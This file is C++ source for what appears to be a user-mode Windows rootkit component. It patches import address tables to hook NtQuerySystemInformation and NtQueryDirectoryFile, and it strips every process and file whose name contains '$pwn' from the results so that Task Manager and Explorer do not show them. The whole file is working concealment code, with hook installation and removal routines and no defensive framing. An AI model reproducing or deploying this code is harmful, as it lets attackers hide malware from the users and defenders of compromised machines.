#include <Windows.h>

#include "iat_hook.h"
#include "win_struct.h"
#include "rootkit.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

using lpNtQuerySystemInformation = NTSTATUS(WINAPI*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
lpNtQuerySystemInformation OriginalNtQuerySystemInformation;

using lpNtQueryDirectoryFile = NTSTATUS(WINAPI*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
lpNtQueryDirectoryFile OriginalNtQueryDirectoryFile;

namespace
{
	// Identifier used to mark every process / file that must be hidden.
	constexpr wchar_t kHiddenToken[] = L"$pwn";

	// A bounded wide string (Windows UNICODE_STRING / file name buffers are
	// not necessarily null-terminated, so the length is always carried along).
	struct WideName
	{
		const wchar_t* lpBuffer;
		size_t Length;
	};

	/**
	 * Case-insensitive search of kHiddenToken inside a bounded wide string.
	 * \param lpName : buffer to inspect, may be nullptr.
	 * \param length : number of characters to inspect.
	 * \return : true if kHiddenToken is found within the bounds.
	 */
	bool ContainsHiddenToken(const wchar_t* lpName, const size_t length)
	{
		if (lpName == nullptr)
			return false;

		constexpr size_t hiddenLength = ARRAYSIZE(kHiddenToken) - 1; // exclude the null terminator
		if (length < hiddenLength)
			return false;

		for (size_t i = 0; i <= length - hiddenLength; ++i)
		{
			if (_wcsnicmp(lpName + i, kHiddenToken, hiddenLength) == 0)
				return true;
		}

		return false;
	}

	/**
	 * Walk a NextEntryOffset linked list and unlink every entry whose name
	 * matches the hidden token, whatever the entry type is.
	 * \param lpBuffer : head of the linked list.
	 * \param getEntryName : accessor returning the bounded name of an entry.
	 */
	template <typename TEntry, typename TGetName>
	void FilterHiddenEntries(PVOID lpBuffer, TGetName getEntryName)
	{
		auto lpNext = static_cast<TEntry*>(lpBuffer);
		TEntry* lpCurrent = nullptr;

		do
		{
			lpCurrent = lpNext;
			lpNext = reinterpret_cast<TEntry*>(reinterpret_cast<DWORD_PTR>(lpCurrent) + lpCurrent->NextEntryOffset);

			const WideName name = getEntryName(lpNext);
			if (ContainsHiddenToken(name.lpBuffer, name.Length))
			{
				if (lpNext->NextEntryOffset == 0)
					lpCurrent->NextEntryOffset = 0;
				else
					lpCurrent->NextEntryOffset += lpNext->NextEntryOffset;

				lpNext = lpCurrent;
			}

		} while (lpCurrent->NextEntryOffset != 0);
	}
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	const NTSTATUS QueryStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemInformationClass == _SYSTEM_INFORMATION_CLASS::SystemProcessInformation && QueryStatus == STATUS_SUCCESS)
	{
		FilterHiddenEntries<SYSTEM_PROCESS_INFORMATION>(SystemInformation, [](PSYSTEM_PROCESS_INFORMATION lpEntry)
		{
			return WideName{ lpEntry->ImageName.Buffer, lpEntry->ImageName.Length / sizeof(wchar_t) };
		});
	}

	return QueryStatus;
}

NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
	const NTSTATUS QueryStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && QueryStatus == STATUS_SUCCESS)
	{
		FilterHiddenEntries<FILE_ID_BOTH_DIR_INFORMATION>(FileInformation, [](PFILE_ID_BOTH_DIR_INFORMATION lpEntry)
		{
			return WideName{ lpEntry->FileName, lpEntry->FileNameLength / sizeof(wchar_t) };
		});
	}

	return QueryStatus;
}

DWORD WINAPI InitHook(LPVOID)
{
	OriginalNtQuerySystemInformation = (lpNtQuerySystemInformation) IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &HookedNtQuerySystemInformation);
	OriginalNtQueryDirectoryFile = (lpNtQueryDirectoryFile) IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &HookedNtQueryDirectoryFile, "windows.storage.dll");

	ExitThread(0);
}

void RemoveHookAndFreeLibrary(const HMODULE hModule)
{
	IAT::Hook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)OriginalNtQuerySystemInformation);
	IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)OriginalNtQueryDirectoryFile, "windows.storage.dll");

	FreeLibraryAndExitThread(hModule, 0);
}
